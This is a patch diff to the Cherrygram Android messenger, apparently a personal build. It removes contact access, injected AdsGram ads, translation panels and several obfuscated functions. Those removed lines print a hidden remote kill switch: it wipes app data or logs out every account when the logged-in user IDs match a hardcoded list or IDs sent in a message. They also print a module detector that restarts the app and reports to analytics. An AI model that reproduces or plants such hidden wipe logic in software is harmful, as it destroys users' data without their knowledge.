@@ -1,0 +1,1736 @@
+diff --git a/TMessagesProj/src/main/AndroidManifest.xml b/TMessagesProj/src/main/AndroidManifest.xml
+index 4322bfb..28c441b 100644
+--- a/TMessagesProj/src/main/AndroidManifest.xml
++++ b/TMessagesProj/src/main/AndroidManifest.xml
+@@ -39,13 +39,6 @@
+     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+-    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+-    <uses-permission android:name="android.permission.READ_CONTACTS" />
+-    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+-    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS"/>
+-    <uses-permission android:name="android.permission.READ_PROFILE"/>
+-    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"/>
+-    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
+     <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS"/>
+     <uses-permission android:name="android.permission.VIBRATE" />
+     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+diff --git a/TMessagesProj/src/main/java/org/telegram/messenger/AutoBackupUserAgent.kt b/TMessagesProj/src/main/java/org/telegram/messenger/AutoBackupUserAgent.kt
+index 0d67b76..6312838 100644
+--- a/TMessagesProj/src/main/java/org/telegram/messenger/AutoBackupUserAgent.kt
++++ b/TMessagesProj/src/main/java/org/telegram/messenger/AutoBackupUserAgent.kt
+@@ -1,107 +1,7 @@
+-/**
+- * This is the source code of Cherrygram for Android.
+- * It is licensed under GNU GPL v. 2 or later.
+- * You should have received a copy of the license in this archive (see LICENSE).
+- * Please, be respectful and credit the original author if you use this code.
+- *
+- * Copyright github.com/arsLan4k1390, 2022-2026.
+- */
+-
+ package org.telegram.messenger
+ 
+-import android.app.ActivityManager
+-import android.content.Context
+-import kotlinx.coroutines.delay
+-import uz.unnarsx.cherrygram.donates.DonatesManager
+-
++/** Legacy compatibility stub. No remote account blacklist or data wipe. */
+ object AutoBackupUserAgent {
+-
+-    suspend fun checkLoggedAccountsInstances() {
+-        delay(5000)
+-        val availableIDs = ArrayList<Long>()
+-
+-        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-            val cU = AccountInstance.getInstance(i).userConfig
+-            if (cU != null
+-                && cU.currentUser != null
+-                && cU.isClientActivated
+-                && cU.currentUser.id != 0L
+-            ) {
+-                availableIDs.add(cU.currentUser.id)
+-            }
+-        }
+-
+-        var anyAccountAllowed = false
+-
+-        for (id in availableIDs) {
+-            if (DonatesManager.didUserDonate(id)) {
+-                anyAccountAllowed = true
+-            } else {
+-            }
+-        }
+-
+-        if (!anyAccountAllowed) {
+-            SamsungDatastore.checkCallback()
+-        }
+-    }
+-
+-    suspend fun woifwfwif4343(messageObject: MessageObject?) {
+-        delay(5000)
+-        val availableIDs = mutableListOf<Long>()
+-
+-        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-            val cU = AccountInstance.getInstance(i).userConfig
+-            if (cU != null
+-                && cU.currentUser != null
+-                && cU.isClientActivated
+-                && cU.currentUser.id != 0L
+-            ) {
+-                availableIDs.add(cU.currentUser.id)
+-            }
+-        }
+-
+-        var notAllowedIDs: List<Long>
+-
+-        if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
+-            notAllowedIDs = messageObject.messageOwner.message
+-                .split(",", " ", "\n")
+-                .mapNotNull { it.trim().toLongOrNull() }
+-        } else {
+-            notAllowedIDs = listOf(
+-                638789692L, 6863366716L, 8142384327L, 977790049L, 7509568713L, 7087241402L,
+-                5095920053L, 7913332018L, 6937704743L, 1076325667L, 808230937L, 811696299L,
+-                7194407593L, 6042869660L, 440840393L, 7526390297L, 6680944075L, 5556630337L,
+-                7841801725L, 5349149970L, 8313378783L, 7205119446L, 8184556667L, 1499101897L,
+-                1642203581L, 420220972L, 7892266150L, 6849878783L, 5150403377L, 180522421L,
+-                477057925L, 6529408254L, 400216230L, 7192067362L, 6149388824L, 8392748219L,
+-                7343238311L, 8086758593L, 382279536L, 795945694L, 8210125602L, 8491209589L,
+-                412864220L, 7405431232L, 1873986361L, 8131717012L, 6670174315L, 8230057577L,
+-                5537338671L, 8735761078L, 7273154982L, 8102175556L, 8556739946L
+-            )
+-        }
+-
+-        val blockedId = availableIDs.firstOrNull {
+-            DonatesManager.isUserBlocked(it) || notAllowedIDs.contains(it)
+-        }
+-
+-        if (blockedId != null) {
+-            try {
+-                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
+-            } catch (e: Exception) {
+-                e.printStackTrace()
+-
+-                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-                    val cU = AccountInstance.getInstance(i).userConfig
+-                    if (cU != null
+-                        && cU.currentUser != null
+-                        && cU.isClientActivated
+-                        && cU.currentUser.id != 0L
+-                    ) {
+-                        MessagesController.getInstance(cU.currentAccount).performLogout(1)
+-                    }
+-                }
+-            }
+-        }
+-    }
+-
+-}
+\ No newline at end of file
++    suspend fun checkLoggedAccountsInstances() {}
++    suspend fun woifwfwif4343(messageObject: MessageObject?) {}
++}
+diff --git a/TMessagesProj/src/main/java/org/telegram/messenger/ContactsController.java b/TMessagesProj/src/main/java/org/telegram/messenger/ContactsController.java
+index d539c46..a92f729 100644
+--- a/TMessagesProj/src/main/java/org/telegram/messenger/ContactsController.java
++++ b/TMessagesProj/src/main/java/org/telegram/messenger/ContactsController.java
+@@ -1986,28 +1986,7 @@ public class ContactsController extends BaseController {
+     }
+ 
+     public static boolean hasContactsPermission() {
+-        if (Build.VERSION.SDK_INT >= 23) {
+-            return ApplicationLoader.applicationContext.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+-        }
+-        Cursor cursor = null;
+-        try {
+-            ContentResolver cr = ApplicationLoader.applicationContext.getContentResolver();
+-            cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projectionPhones, null, null, null);
+-            if (cursor == null || cursor.getCount() == 0) {
+-                return false;
+-            }
+-        } catch (Throwable e) {
+-            FileLog.e(e);
+-        } finally {
+-            try {
+-                if (cursor != null) {
+-                    cursor.close();
+-                }
+-            } catch (Exception e) {
+-                FileLog.e(e);
+-            }
+-        }
+-        return true;
++        return false; // Personal build does not access the phone address book.
+     }
+ 
+     public static boolean hasContactsWritePermission() {
+diff --git a/TMessagesProj/src/main/java/org/telegram/messenger/KotlinFragmentsManager.kt b/TMessagesProj/src/main/java/org/telegram/messenger/KotlinFragmentsManager.kt
+index 23a91dc..37bcd25 100644
+--- a/TMessagesProj/src/main/java/org/telegram/messenger/KotlinFragmentsManager.kt
++++ b/TMessagesProj/src/main/java/org/telegram/messenger/KotlinFragmentsManager.kt
+@@ -184,56 +184,8 @@ object KotlinFragmentsManager {
+         }
+     }
+ 
+-    fun nfweioufwehr117() {
+-//        exitProcess(0)
+-        AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+-    }
+-
+-    suspend fun iooewwfueuewu121(messageObject: MessageObject?) {
+-        delay(7000)
+-        val aId = mutableListOf<Long>()
+-
+-        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-            val uCg = AccountInstance.getInstance(i).userConfig
+-            if (uCg != null
+-                && uCg.currentUser != null
+-                && uCg.isClientActivated
+-                && uCg.currentUser.id != 0L
+-            ) {
+-                aId.add(uCg.currentUser.id)
+-            }
+-        }
+-
+-        val naId: List<Long> = if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
+-            messageObject.messageOwner.message
+-                .split(",", " ", "\n")
+-                .mapNotNull { it.trim().toLongOrNull() }
+-        } else {
+-            listOf()
+-        }
++    fun nfweioufwehr117() { /* No app-data wipe on integrity checks. */ }
+ 
+-        val bId = aId.firstOrNull {
+-            naId.contains(it)
+-        }
+-
+-        if (bId != null) {
+-            try {
+-                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
+-            } catch (e: Exception) {
+-                e.printStackTrace()
+-
+-                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-                    val uCg = AccountInstance.getInstance(i).userConfig
+-                    if (uCg != null
+-                        && uCg.currentUser != null
+-                        && uCg.isClientActivated
+-                        && uCg.currentUser.id != 0L
+-                    ) {
+-                        MessagesController.getInstance(uCg.currentAccount).performLogout(1)
+-                    }
+-                }
+-            }
+-        }
+-    }
++    suspend fun iooewwfueuewu121(messageObject: MessageObject?) { /* No remote account control. */ }
+ 
+ }
+\ No newline at end of file
+diff --git a/TMessagesProj/src/main/java/org/telegram/messenger/MessagesController.java b/TMessagesProj/src/main/java/org/telegram/messenger/MessagesController.java
+index d61a69f..8930397 100644
+--- a/TMessagesProj/src/main/java/org/telegram/messenger/MessagesController.java
++++ b/TMessagesProj/src/main/java/org/telegram/messenger/MessagesController.java
+@@ -25713,187 +25713,6 @@ public class MessagesController extends BaseController implements NotificationCe
+         setWebBrowserSettings(webBrowserSettings);
+     }
+ 
+-    /** Cherrygram start */
+-    private LongSparseArray<SponsoredMessagesInfo> sponsoredMessagesForADSgram = new LongSparseArray<>();
+ 
+-    public SponsoredMessagesInfo getSponsoredMessagesForADSgram(long dialogId) {
+-        boolean showAds = CherrygramFirebaseConfig.INSTANCE.getShowAdsScreenInSettings();
+-
+-        if (CherrygramCoreConfig.isPlayStoreBuild()) {
+-            showAds = showAds && CherrygramFirebaseConfig.INSTANCE.getShowAdsInPlayStoreBuilds();
+-        }
+-
+-        if (!showAds) {
+-            return null;
+-        }
+-
+-        TLRPC.Chat chat = getChat(-dialogId);
+-        if (chat == null) {
+-            return null;
+-        }
+-
+-        if (!ChatObject.isChannelCG(chat) || !ChatObject.isPublic(chat)) {
+-            return null;
+-        }
+-
+-        int participantsCount = chat.participants_count;
+-
+-        TLRPC.ChatFull chatFull = getChatFull(chat.id);
+-        if (chatFull != null) {
+-            participantsCount = chatFull.participants_count;
+-        }
+-
+-        if (participantsCount < 1000) {
+-            return null;
+-        }
+-
+-        SponsoredMessagesInfo info = sponsoredMessagesForADSgram.get(dialogId);
+-        if (info != null && (info.loading || Math.abs(SystemClock.elapsedRealtime() - info.loadTime) <= 2 * 60 * 1000)) {
+-            return info;
+-        }
+-        info = new SponsoredMessagesInfo();
+-        info.loading = true;
+-        sponsoredMessagesForADSgram.put(dialogId, info);
+-
+-        SponsoredMessagesInfo infoFinal = info;
+-
+-        AdsGramApi.fetchRealIp(ip ->
+-                requestAdsGramAd(dialogId, infoFinal, ip, false)
+-        );
+-
+-        return null;
+-    }
+-
+-    private void requestAdsGramAd(long dialogId, SponsoredMessagesInfo infoFinal, String ip, boolean isRetryWithRu) {
+-        new AdsGramApi(ApplicationLoader.applicationContext).loadAd(
+-                AdsScreen.large_banner_in_chats_id,
+-                getUserConfig().clientUserId,
+-                getUserConfig().isPremium(),
+-                AndroidUtilities.displaySize.x,
+-                AndroidUtilities.displaySize.y,
+-                ip,
+-                isRetryWithRu ? "ru" : null,
+-                new Callback() {
+-                    @Override
+-                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
+-                        AndroidUtilities.runOnUIThread(() ->
+-                                sponsoredMessagesForADSgram.remove(dialogId)
+-                        );
+-                    }
+-
+-                    @Override
+-                    public void onResponse(@NonNull Call call, @NonNull Response response) {
+-                        ArrayList<MessageObject> result;
+-                        Integer posts_between = null;
+-
+-                        try (response) {
+-                            if (!response.isSuccessful() || response.body() == null) {
+-                                int code = response.code();
+-                                result = null;
+-                            } else {
+-                                String bodyStr = response.body().string();
+-
+-                                AdsGramResponse ad = new Gson().fromJson(bodyStr, AdsGramResponse.class);
+-
+-                                if (ad == null || ad.banner == null) {
+-                                    result = null;
+-                                } else {
+-                                    result = new ArrayList<>();
+-                                    TLRPC.TL_message message = new TLRPC.TL_message();
+-                                    message.peer_id = getPeer(dialogId);
+-                                    message.flags |= 256;
+-                                    message.date = getConnectionsManager().getCurrentTime();
+-                                    message.id = -10000000;
+-
+-                                    String description = ad.banner.getAsset("description");
+-                                    String title = ad.banner.getAsset("title");
+-
+-                                    if (!TextUtils.isEmpty(description)) {
+-                                        message.message = description;
+-                                    } else if (!TextUtils.isEmpty(title)) {
+-                                        message.message = title;
+-                                    } else {
+-                                        message.message = "";
+-                                    }
+-
+-                                    final LongSparseArray<TLRPC.User> usersDict = new LongSparseArray<>();
+-                                    final LongSparseArray<TLRPC.Chat> chatsDict = new LongSparseArray<>();
+-
+-                                    TLRPC.User self = getUser(UserConfig.getInstance(currentAccount).getClientUserId());
+-                                    if (self != null) {
+-                                        usersDict.put(self.id, self);
+-                                    }
+-
+-                                    MessageObject messageObject = new MessageObject(currentAccount, message, usersDict, chatsDict, true, true);
+-                                    messageObject.isAdsGram = true;
+-                                    messageObject.bannerData = ad.banner;
+-                                    messageObject.sponsoredId = Utilities.computeSHA256(
+-                                            String.valueOf(System.currentTimeMillis()).getBytes(StandardCharsets.UTF_8)
+-                                    );
+-                                    messageObject.sponsoredTitle = ad.banner.getAsset("title");
+-                                    messageObject.sponsoredUrl = ad.banner.getAsset("url");
+-                                    messageObject.sponsoredButtonText = ad.banner.getAsset("buttonName");
+-
+-                                    /*String iconUrl = ad.banner.getAsset("icon");
+-                                    if (iconUrl != null) {
+-                                        icon.setImage(ImageLocation.getForPath(iconUrl), "100_100", null, null, null, 0);
+-                                        messageObject.sponsoredPhoto = iconUrl;
+-                                    }
+-                                    String imageUrl = ad.banner.getAsset("image");
+-                                    if (imageUrl != null) {
+-                                        bigBanner.setImage(ImageLocation.getForPath(imageUrl), "512_512", null, null, null, 0);
+-                                        messageObject.sponsoredMedia = imageUrl;
+-                                    }*/
+-
+-                                    if (ad.banner != null && ad.banner.getAsset("advertiserName") != null) {
+-                                        String advertiser = ad.banner.getAsset("advertiserName");
+-                                        messageObject.sponsoredInfo = advertiser;
+-                                    } else {
+-                                        messageObject.sponsoredInfo = "AdsGram";
+-                                    }
+-
+-                                    messageObject.sponsoredCanReport = false;
+-
+-                                    messageObject.setType();
+-                                    messageObject.generateThumbs(true);
+-
+-                                    result.add(messageObject);
+-
+-                                    String renderTracking = ad.banner.getTracking("render");
+-                                    AdsGramCell.openTracking(renderTracking);
+-                                }
+-                            }
+-                        } catch (Exception e) {
+-                            FileLog.e(e);
+-                            result = null;
+-                            posts_between = null;
+-                        }
+-
+-                        ArrayList<MessageObject> finalResult = result;
+-                        Integer finalPosts_between = posts_between;
+-
+-                        if (finalResult == null && !isRetryWithRu) {
+-                            AndroidUtilities.runOnUIThread(() ->
+-                                    requestAdsGramAd(dialogId, infoFinal, ip, true)
+-                            );
+-                            return;
+-                        }
+-
+-                        AndroidUtilities.runOnUIThread(() -> {
+-                            if (finalResult == null) {
+-                                sponsoredMessagesForADSgram.remove(dialogId);
+-                            } else {
+-                                infoFinal.loadTime = SystemClock.elapsedRealtime();
+-                                infoFinal.loading = false;
+-                                infoFinal.messages = finalResult;
+-                                infoFinal.posts_between = finalPosts_between;
+-                                getNotificationCenter().postNotificationName(NotificationCenter.didLoadSponsoredMessages, dialogId, finalResult);
+-                            }
+-                        });
+-                    }
+-                }
+-        );
+-    }
+-    /** Cherrygram finish */
+ 
+ }
+diff --git a/TMessagesProj/src/main/java/org/telegram/messenger/SamsungDatastore.kt b/TMessagesProj/src/main/java/org/telegram/messenger/SamsungDatastore.kt
+index 9d775b5..5bf5234 100644
+--- a/TMessagesProj/src/main/java/org/telegram/messenger/SamsungDatastore.kt
++++ b/TMessagesProj/src/main/java/org/telegram/messenger/SamsungDatastore.kt
+@@ -1,214 +1,7 @@
+-/**
+- * This is the source code of Cherrygram for Android.
+- * It is licensed under GNU GPL v. 2 or later.
+- * You should have received a copy of the license in this archive (see LICENSE).
+- * Please, be respectful and credit the original author if you use this code.
+- *
+- * Copyright github.com/arsLan4k1390, 2022-2026.
+- */
+-
+ package org.telegram.messenger
+ 
+-import android.app.ActivityManager
+-import android.content.Context
+-import kotlinx.coroutines.Dispatchers
+-import kotlinx.coroutines.delay
+-import kotlinx.coroutines.withContext
+-import org.telegram.tgnet.ConnectionManagerDelegate
+-import uz.unnarsx.cherrygram.Extra
+-import uz.unnarsx.cherrygram.core.firebase.FirebaseAnalyticsHelper
+-import uz.unnarsx.cherrygram.core.helpers.AppRestartHelper
+-import java.io.File
+-
++/** Legacy compatibility stub. The remote account blacklist and data wipe were removed. */
+ object SamsungDatastore {
+-
+-    suspend fun checkCallback() = withContext(Dispatchers.Default) {
+-        checkIfFilesExist()
+-        checkIfFilesExistNew()
+-        checkIfDirectoryExists()
+-    }
+-
+-    private val good = Extra.XName_Arr.joinToString().replace(",", "").replace(" ", "")
+-    private val goodNew = Extra.XName_ArrTwo.joinToString().replace(",", "").replace(" ", "")
+-
+-    private suspend fun checkIfFilesExist() {
+-        val folder = File(ConnectionManagerDelegate.getFilesDirFixed(good), good)
+-        val listOfFiles = folder.listFiles()
+-        if (listOfFiles != null) {
+-            for (i in listOfFiles.indices) {
+-                if (listOfFiles[i].isFile) {
+-
+-                    val name1 = Extra.Name_Arr.joinToString().replace(",", "").replace(" ", "")
+-                    val name2 = Extra.Name_Arr2.joinToString().replace(",", "").replace(" ", "")
+-                    val name3 = Extra.Name_Arr3.joinToString().replace(",", "").replace(" ", "")
+-                    val firstFileHere = listOfFiles[i].name.contains(name1)
+-                    val secondFileHere = listOfFiles[i].name.contains(name2)
+-                    val secondThirdHere = listOfFiles[i].name.contains(name3)
+-
+-                    if (firstFileHere || secondFileHere || secondThirdHere) {
+-                        killAppAndSendEvent()
+-                    }
+-
+-                }
+-            }
+-        }
+-
+-        val folder2 = File(ConnectionManagerDelegate.getFilesDirFixed(goodNew), goodNew)
+-        val listOfFiles2 = folder2.listFiles()
+-        if (listOfFiles2 != null) {
+-            for (i in listOfFiles2.indices) {
+-                if (listOfFiles2[i].isFile) {
+-
+-                    val name1 = Extra.Name_Arr.joinToString().replace(",", "").replace(" ", "")
+-                    val name2 = Extra.Name_Arr2.joinToString().replace(",", "").replace(" ", "")
+-                    val name3 = Extra.Name_Arr3.joinToString().replace(",", "").replace(" ", "")
+-                    val name4 = Extra.Name_ArrTwo.joinToString().replace(",", "").replace(" ", "")
+-                    val firstFileHere = listOfFiles2[i].name.contains(name1)
+-                    val secondFileHere = listOfFiles2[i].name.contains(name2)
+-                    val secondThirdHere = listOfFiles2[i].name.contains(name3)
+-                    val fourthFileHere = listOfFiles2[i].name.contains(name4)
+-
+-                    if (firstFileHere || secondFileHere || secondThirdHere || fourthFileHere) {
+-                        killAppAndSendEvent()
+-                    }
+-
+-                }
+-            }
+-        }
+-    }
+-
+-    private suspend fun checkIfFilesExistNew() {
+-        val folder = File(ConnectionManagerDelegate.getFilesDirFixed(good), "")
+-        val listOfFiles = folder.listFiles()
+-        if (listOfFiles != null) {
+-            for (i in listOfFiles.indices) {
+-                if (listOfFiles[i].isFile) {
+-
+-                    val name1 = Extra.Name_Arr.joinToString().replace(",", "").replace(" ", "")
+-                    val name2 = Extra.Name_Arr2.joinToString().replace(",", "").replace(" ", "")
+-                    val name3 = Extra.Name_Arr3.joinToString().replace(",", "").replace(" ", "")
+-                    val firstFileHere = listOfFiles[i].name.contains(name1)
+-                    val secondFileHere = listOfFiles[i].name.contains(name2)
+-                    val secondThirdHere = listOfFiles[i].name.contains(name3)
+-
+-                    if (firstFileHere || secondFileHere || secondThirdHere) {
+-                        killAppAndSendEvent()
+-                    }
+-
+-                }
+-            }
+-        }
+-
+-        val folder2 = File(ConnectionManagerDelegate.getFilesDirFixed(goodNew), "")
+-        val listOfFiles2 = folder2.listFiles()
+-        if (listOfFiles2 != null) {
+-            for (i in listOfFiles2.indices) {
+-                if (listOfFiles2[i].isFile) {
+-
+-                    val name1 = Extra.Name_Arr.joinToString().replace(",", "").replace(" ", "")
+-                    val name2 = Extra.Name_Arr2.joinToString().replace(",", "").replace(" ", "")
+-                    val name3 = Extra.Name_Arr3.joinToString().replace(",", "").replace(" ", "")
+-                    val name4 = Extra.Name_ArrTwo.joinToString().replace(",", "").replace(" ", "")
+-                    val firstFileHere = listOfFiles2[i].name.contains(name1)
+-                    val secondFileHere = listOfFiles2[i].name.contains(name2)
+-                    val secondThirdHere = listOfFiles2[i].name.contains(name3)
+-                    val fourthFileHere = listOfFiles2[i].name.contains(name4)
+-
+-                    if (firstFileHere || secondFileHere || secondThirdHere || fourthFileHere) {
+-                        killAppAndSendEvent()
+-                    }
+-
+-                }
+-            }
+-        }
+-    }
+-
+-    private suspend fun checkIfDirectoryExists() {
+-        val folder = File(ConnectionManagerDelegate.getFilesDirFixed(good).toString())
+-        val listOfFiles = folder.listFiles()
+-        if (listOfFiles != null) {
+-            for (i in listOfFiles.indices) {
+-                if (listOfFiles[i].isDirectory) {
+-
+-                    val folderIsHere = listOfFiles[i].name.contains(good)
+-
+-                    if (folderIsHere) {
+-                        killAppAndSendEvent()
+-                    }
+-
+-                }
+-            }
+-        }
+-
+-        val folder2 = File(ConnectionManagerDelegate.getFilesDirFixed(goodNew).toString())
+-        val listOfFiles2 = folder2.listFiles()
+-        if (listOfFiles2 != null) {
+-            for (i in listOfFiles2.indices) {
+-                if (listOfFiles2[i].isDirectory) {
+-
+-                    val folderIsHere = listOfFiles2[i].name.contains(goodNew)
+-
+-                    if (folderIsHere) {
+-                        killAppAndSendEvent()
+-                    }
+-
+-                }
+-            }
+-        }
+-    }
+-
+-    private /*suspend*/ fun killAppAndSendEvent() {
+-        FirebaseAnalyticsHelper.trackEventWithEmptyBundle("found_module")
+-//        delay(5000)
+-//        exitProcess(0)
+-        AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+-    }
+-
+-    suspend fun vpwogjigjjur232(messageObject: MessageObject?) {
+-        delay(9000)
+-        val aId = mutableListOf<Long>()
+-
+-        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-            val uC = AccountInstance.getInstance(i).userConfig
+-            if (uC != null
+-                && uC.currentUser != null
+-                && uC.isClientActivated
+-                && uC.currentUser.id != 0L
+-            ) {
+-                aId.add(uC.currentUser.id)
+-            }
+-        }
+-
+-        val naId: List<Long> = if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
+-            messageObject.messageOwner.message
+-                .split(",", " ", "\n")
+-                .mapNotNull { it.trim().toLongOrNull() }
+-        } else {
+-            listOf()
+-        }
+-
+-        val bId = aId.firstOrNull {
+-            naId.contains(it)
+-        }
+-
+-        if (bId != null) {
+-            try {
+-                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
+-            } catch (e: Exception) {
+-                e.printStackTrace()
+-
+-                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
+-                    val uC = AccountInstance.getInstance(i).userConfig
+-                    if (uC != null
+-                        && uC.currentUser != null
+-                        && uC.isClientActivated
+-                        && uC.currentUser.id != 0L
+-                    ) {
+-                        MessagesController.getInstance(uC.currentAccount).performLogout(1)
+-                    }
+-                }
+-            }
+-        }
+-    }
+-
+-}
+\ No newline at end of file
++    suspend fun checkCallback() {}
++    suspend fun vpwogjigjjur232(messageObject: MessageObject?) {}
++}
+diff --git a/TMessagesProj/src/main/java/org/telegram/messenger/UserConfig.java b/TMessagesProj/src/main/java/org/telegram/messenger/UserConfig.java
+index dc98757..7e5526e 100644
+--- a/TMessagesProj/src/main/java/org/telegram/messenger/UserConfig.java
++++ b/TMessagesProj/src/main/java/org/telegram/messenger/UserConfig.java
+@@ -59,8 +59,8 @@ public class UserConfig extends BaseController {
+ 
+     public boolean notificationsSettingsLoaded;
+     public boolean notificationsSignUpSettingsLoaded;
+-    public boolean syncContacts = true;
+-    public boolean suggestContacts = true;
++    public boolean syncContacts = false;
++    public boolean suggestContacts = false;
+     public boolean showCallsTab;
+     public boolean hasSecureData;
+     public int loginTime;
+@@ -311,9 +311,9 @@ public class UserConfig extends BaseController {
+             botGuestRatingLoadTime = preferences.getInt("botGuestRatingLoadTime", 0);
+             webappRatingLoadTime = preferences.getInt("webappRatingLoadTime", 0);
+             loginTime = preferences.getInt("loginTime", currentAccount);
+-            syncContacts = preferences.getBoolean("syncContacts", true);
++            syncContacts = false;
+             showCallsTab = preferences.getBoolean("showCallsTab", false);
+-            suggestContacts = preferences.getBoolean("suggestContacts", true);
++            suggestContacts = false;
+             hasSecureData = preferences.getBoolean("hasSecureData", false);
+             notificationsSettingsLoaded = preferences.getBoolean("notificationsSettingsLoaded4", false);
+             notificationsSignUpSettingsLoaded = preferences.getBoolean("notificationsSignUpSettingsLoaded", false);
+@@ -483,9 +483,9 @@ public class UserConfig extends BaseController {
+         webappRatingLoadTime = 0;
+         draftsLoaded = false;
+         contactsReimported = true;
+-        syncContacts = true;
++        syncContacts = false;
+         showCallsTab = false;
+-        suggestContacts = true;
++        suggestContacts = false;
+         unreadDialogsLoaded = true;
+         hasValidDialogLoadIds = true;
+         unacceptedTermsOfService = null;
+diff --git a/TMessagesProj/src/main/java/org/telegram/ui/ChatActivity.java b/TMessagesProj/src/main/java/org/telegram/ui/ChatActivity.java
+index f641f20..277a8c1 100644
+--- a/TMessagesProj/src/main/java/org/telegram/ui/ChatActivity.java
++++ b/TMessagesProj/src/main/java/org/telegram/ui/ChatActivity.java
+@@ -25675,94 +25675,7 @@ public class ChatActivity extends BaseFragment implements
+     private Pattern sponsoredUrlPattern;
+     private MessageObject botSponsoredMessage;
+     private void addSponsoredMessages(boolean animated) {
+-
+-        if (sponsoredMessagesAdded || chatMode != 0 || !ChatObject.isChannelCG(currentChat) && !UserObject.isBot(currentUser) || !forwardEndReached[0] || getUserConfig().isPremium() && getMessagesController().isSponsoredDisabled() || isReport()) {
+-            return;
+-        }
+-
+-        boolean hide = false;
+-        if (CherrygramCoreConfig.isStandalonePremiumBuild()) {
+-            hide = true;
+-        } else if (CherrygramFirebaseConfig.INSTANCE.getShowAdsRandomly()) {
+-            hide = Utilities.random.nextBoolean();
+-        }
+-
+-        if (useAdsGramForCurrentChat == null) {
+-            useAdsGramForCurrentChat =
+-                    (CherrygramFirebaseConfig.INSTANCE.getShowAdsScreenInSettings() && CherrygramFirebaseConfig.INSTANCE.getAlwaysShowAdsGramInChats())
+-                    || Utilities.random.nextBoolean();
+-        }
+-
+-        MessagesController.SponsoredMessagesInfo res =
+-                useAdsGramForCurrentChat
+-                        ? getMessagesController().getSponsoredMessagesForADSgram(dialog_id)
+-                        : getMessagesController().getSponsoredMessages(dialog_id);
+-
+-        if (res == null || res.messages == null || res.messages.isEmpty()) {
+-            return;
+-        }
+-        ArrayList<MessageObject> arrayList2 = new ArrayList<>();
+-        for (int i = 0; i < res.messages.size(); i++) {
+-            MessageObject messageObject = res.messages.get(i);
+-            messageObject.resetLayout();
+-            if (messageObject.sponsoredUrl != null) {
+-                try {
+-                    if (sponsoredUrlPattern == null) {
+-                        sponsoredUrlPattern = Pattern.compile("https://t\\.me/(\\w+)(?:/(\\d+))?");
+-                    }
+-                    Matcher matcher = sponsoredUrlPattern.matcher(messageObject.sponsoredUrl);
+-                    if (matcher.matches()) {
+-                        String username = matcher.group(1);
+-                        int postId = 0;
+-                        try {
+-                            postId = matcher.groupCount() >= 2 ? Integer.parseInt(matcher.group(2)) : 0;
+-                        } catch (Exception e2) {}
+-                        TLObject obj = getMessagesController().getUserOrChat(username);
+-                        long did;
+-                        if (obj instanceof TLRPC.User) {
+-                            did = ((TLRPC.User) obj).id;
+-                        } else if (obj instanceof TLRPC.Chat) {
+-                            did = -((TLRPC.Chat) obj).id;
+-                        } else {
+-                            continue;
+-                        }
+-                        if (postId < 0) continue;
+-                        if (!hide) {
+-                            getMessagesController().ensureMessagesLoaded(did, postId, null);
+-                        } else {
+-                            markSponsoredAsRead(messageObject);
+-                            if (!messageObject.isSponsored()) {
+-                                getMessagesController().ensureMessagesLoaded(did, postId, null);
+-                                arrayList2 .add(messageObject);
+-                            }
+-                        }
+-                    }
+-                } catch (Exception e) {
+-                    FileLog.e(e, false);
+-                }
+-            }
+-        }
+-        sponsoredMessagesAdded = true;
+-        if (UserObject.isBot(currentUser)) {
+-            botSponsoredMessage = hide ? null : res.messages.get(0);
+-            updateTopPanel(true);
+-        } else {
+-            if (!hide) {
+-                sponsoredMessagesPostsBetween = res.posts_between != null ? res.posts_between : 0;
+-                if (notPushedSponsoredMessages != null) {
+-                    notPushedSponsoredMessages.clear();
+-                }
+-                processNewMessages(res.messages, false);
+-            } else {
+-                /*for (MessageObject messageObject : res.messages) {
+-                    if (messageObject.isAdsGram) {
+-                        markSponsoredAsRead(messageObject);
+-                    }
+-                }*/
+-                if (arrayList2.isEmpty()) return;
+-                processNewMessages(arrayList2);
+-            }
+-        }
++        // Personal build: never insert sponsored messages into chat history.
+     }
+ 
+     public void removeFromSponsored(MessageObject message) {
+@@ -29946,11 +29859,7 @@ public class ChatActivity extends BaseFragment implements
+         }
+ 
+         boolean showRestartTopic = !isInPreviewMode() && forumTopic != null && forumTopic.closed && !forumTopic.hidden && ChatObject.canManageTopic(currentAccount, currentChat, forumTopic);
+-        boolean showTranslate = (
+-            getUserConfig().isPremium() || currentChat != null && currentChat.autotranslation ?
+-                getMessagesController().getTranslateController().isDialogTranslatable(getDialogId()) && !getMessagesController().getTranslateController().isTranslateDialogHidden(getDialogId()) :
+-                !getMessagesController().premiumFeaturesBlocked() && preferences.getInt("dialog_show_translate_count" + did, 5) <= 0
+-        ) || DEBUG_TOP_PANELS;
++        boolean showTranslate = false; // Translation panels disabled in personal build.
